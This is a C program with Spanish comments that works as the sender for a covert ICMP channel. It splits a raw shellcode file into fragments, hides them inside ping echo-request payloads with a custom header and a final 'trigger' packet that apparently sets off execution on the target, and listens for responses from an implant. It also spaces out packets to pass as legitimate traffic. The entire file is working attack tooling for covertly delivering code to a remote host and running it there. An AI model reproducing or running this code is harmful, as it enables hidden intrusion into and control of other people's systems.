#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <errno.h>
#include <pthread.h>

// Definiciones:
// Tamaño total del payload de cada paquete: 56 bytes.
// Usaremos 6 bytes para nuestro encabezado personalizado y 50 bytes para datos.
#define PAYLOAD_SIZE 56
#define DATA_SIZE 50

// Definición de tipos de paquete personalizados:
#define PKT_TYPE_DATA    0x01   // Fragmento normal de shellcode.
#define PKT_TYPE_TRIGGER 0xFF   // Indica que es el último fragmento (TRIGGER).

// En nuestro ejemplo para respuesta se usa tipo 0x02 (podrías modificarlo)
#define PKT_TYPE_RESPONSE 0x02

// Estructura del encabezado personalizado (packed para evitar padding)
#pragma pack(push, 1)
typedef struct {
    uint8_t type;           // Tipo: 0x01 para fragmento, 0xFF para trigger, 0x02 para respuesta.
    uint16_t id;            // Identificador del payload (para relacionar fragmentos).
    uint16_t offset;        // Offset en bytes del fragmento dentro del shellcode.
    uint8_t checksum;       // Checksum simple de los 50 bytes de datos.
    uint8_t data[DATA_SIZE]; // Fragmento de shellcode o respuesta (hasta 50 bytes).
} icmp_payload_t;
#pragma pack(pop)

// Función para calcular un checksum simple: suma de cada byte (módulo 256).
uint8_t calc_simple_checksum(uint8_t *data, size_t len) {
    uint32_t sum = 0;
    for (size_t i = 0; i < len; i++) {
        sum += data[i];
    }
    return (uint8_t)(sum & 0xFF);
}

// Función para calcular el checksum de ICMP (one’s complement)
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for ( ; len > 1; len -= 2 )
        sum += *buf++;
    if ( len == 1 )
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// --- Variables y definiciones para el hilo de escucha ---
typedef enum { CLOSE, OPEN } EstadoListener;
int listener_activo = 0;
pthread_t hilo_listener;
// Global para identificar la respuesta asociada al mismo payload
uint16_t global_payload_id = 0;

// Función del hilo que escucha respuestas ICMP
void *listener_thread(void *arg) {
    int sockfd;
    struct sockaddr_in src_addr;
    socklen_t addr_len = sizeof(src_addr);
    uint8_t packet[1024];

    // Abrir socket RAW para ICMP (se requiere privilegios CAP_NET_RAW)
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        perror("Error al crear socket de escucha");
        pthread_exit(NULL);
    }

    printf("[Listener] Iniciado, esperando respuestas para el id %d...\n", global_payload_id);
    while (1) {
        ssize_t bytes = recvfrom(sockfd, packet, sizeof(packet), 0,
                                 (struct sockaddr *)&src_addr, &addr_len);
        if (bytes < 0) {
            perror("Error en recvfrom en listener");
            continue;
        }
        // El paquete incluye cabecera IP; se salta según ip_hl.
        struct ip *ip_hdr = (struct ip *)packet;
        int ip_hdr_len = ip_hdr->ip_hl * 4;
        if (bytes < ip_hdr_len + sizeof(struct icmphdr) + PAYLOAD_SIZE)
            continue;
        
        struct icmphdr *icmp_hdr = (struct icmphdr *)(packet + ip_hdr_len);
        // Procesamos solo Echo Request (o podrías filtrar por otro tipo si tu módulo responde diferente)
        if (icmp_hdr->type != ICMP_ECHO)
            continue;
        
        icmp_payload_t payload;
        memcpy(&payload, packet + ip_hdr_len + sizeof(struct icmphdr), PAYLOAD_SIZE);

        // Verificar que el id del payload coincide con el esperado
        if (ntohs(payload.id) != global_payload_id)
            continue;

        // Si el paquete es de respuesta (tipo 0x02), se procesa la salida
        if (payload.type == PKT_TYPE_RESPONSE) {
            printf("[Listener] Respuesta recibida (offset %d):\n", ntohs(payload.offset));
            // Mostrar los datos en hexadecimal
            for (int i = 0; i < DATA_SIZE; i++) {
                printf("%02X ", payload.data[i]);
            }
            printf("\n");
        }
    }
    close(sockfd);
    pthread_exit(NULL);
}

// Función para controlar el hilo de escucha
int controlar_listener(EstadoListener estado) {
    if (estado == OPEN && !listener_activo) {
        if (pthread_create(&hilo_listener, NULL, listener_thread, NULL) != 0) {
            perror("[ERROR] No se pudo crear el hilo de escucha");
            return -1;
        }
        listener_activo = 1;
        sleep(1); // Espera breve para asegurar que el hilo inicia
    } else if (estado == CLOSE && listener_activo) {
        pthread_cancel(hilo_listener);
        pthread_join(hilo_listener, NULL);
        listener_activo = 0;
    }
    return 0;
}

// --- Función principal: envío de shellcode fragmentado y activación del listener ---
int main(int argc, char *argv[]) {
    if(argc != 4) {
        fprintf(stderr, "Uso: %s <IP destino> <archivo_shellcode.bin> <id>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    char *dest_ip = argv[1];
    char *filename = argv[2];
    uint16_t payload_id = (uint16_t)atoi(argv[3]);
    global_payload_id = payload_id;  // Se asigna para que el listener filtre los paquetes

    // Abrir el archivo del shellcode (binario “crudo” sin cabecera ELF)
    FILE *fp = fopen(filename, "rb");
    if(!fp) {
        perror("Error al abrir el archivo");
        exit(EXIT_FAILURE);
    }

    // Determinar tamaño del archivo
    fseek(fp, 0, SEEK_END);
    long shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    // Cargar el shellcode en memoria
    uint8_t *shellcode = malloc(shellcode_size);
    if(!shellcode) {
        perror("Error al asignar memoria para el shellcode");
        fclose(fp);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    // Iniciar el hilo de escucha para las respuestas
    if (controlar_listener(OPEN) < 0) {
        free(shellcode);
        exit(EXIT_FAILURE);
    }

    // Crear socket RAW para ICMP (se requiere privilegios CAP_NET_RAW)
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(sockfd < 0) {
        perror("Error al crear el socket");
        free(shellcode);
        exit(EXIT_FAILURE);
    }

    // Configurar la dirección destino
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    if(inet_pton(AF_INET, dest_ip, &dest_addr.sin_addr) <= 0) {
        fprintf(stderr, "IP destino inválida.\n");
        free(shellcode);
        exit(EXIT_FAILURE);
    }

    // Fragmentar el shellcode en bloques de 50 bytes de datos (más 6 bytes de header = 56 bytes de payload)
    int sequence = 0;
    for (int offset = 0; offset < shellcode_size; offset += DATA_SIZE) {
        // Construir el paquete ICMP:
        //  - 8 bytes de cabecera ICMP.
        //  - 56 bytes de payload (nuestro encabezado personalizado + datos).
        uint8_t packet[8 + PAYLOAD_SIZE];
        memset(packet, 0, sizeof(packet));

        // Rellenar la cabecera ICMP (utilizando el struct icmphdr de <netinet/ip_icmp.h>)
        struct icmphdr *icmp_hdr = (struct icmphdr *) packet;
        icmp_hdr->type = ICMP_ECHO; // Echo Request
        icmp_hdr->code = 0;
        icmp_hdr->un.echo.id = htons(payload_id);
        icmp_hdr->un.echo.sequence = htons(sequence);
        // El checksum se calcula más adelante

        // Construir el payload personalizado
        icmp_payload_t payload;
        // Si es el último fragmento, usamos el tipo TRIGGER
        if (offset + DATA_SIZE >= shellcode_size) {
            payload.type = PKT_TYPE_TRIGGER;
        } else {
            payload.type = PKT_TYPE_DATA;
        }
        payload.id = htons(payload_id);
        payload.offset = htons(offset);
        
        // Copiar datos del shellcode (si es el último fragmento, puede ser menor a 50 bytes)
        size_t bytes_to_copy = DATA_SIZE;
        if (offset + DATA_SIZE > shellcode_size) {
            bytes_to_copy = shellcode_size - offset;
        }
        memset(payload.data, 0, DATA_SIZE);
        memcpy(payload.data, shellcode + offset, bytes_to_copy);
        
        // Calcular el checksum simple para el fragmento
        payload.checksum = calc_simple_checksum(payload.data, DATA_SIZE);

        // Copiar el payload al paquete (después de la cabecera ICMP)
        memcpy(packet + 8, &payload, PAYLOAD_SIZE);

        // Calcular y asignar el checksum de ICMP
        icmp_hdr->checksum = 0;
        icmp_hdr->checksum = checksum(packet, sizeof(packet));

        // Enviar el paquete
        ssize_t sent = sendto(sockfd, packet, sizeof(packet), 0,
                              (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if(sent < 0) {
            perror("Error al enviar el paquete");
        } else {
            printf("[Sender] Enviado paquete secuencia %d, offset %d, tipo 0x%02X\n", sequence, offset, payload.type);
        }
        sequence++;
        // Para simular tráfico legítimo se puede insertar un retardo (100 ms en este caso)
        usleep(100000);
    }

    // Libera el shellcode de memoria
    free(shellcode);

    // Espera un tiempo para recibir la respuesta (ajusta según convenga)
    printf("[Sender] Envío completado. Esperando respuestas...\n");
    sleep(5);

    // Detener el hilo de escucha
    controlar_listener(CLOSE);
    close(sockfd);

    return 0;
}
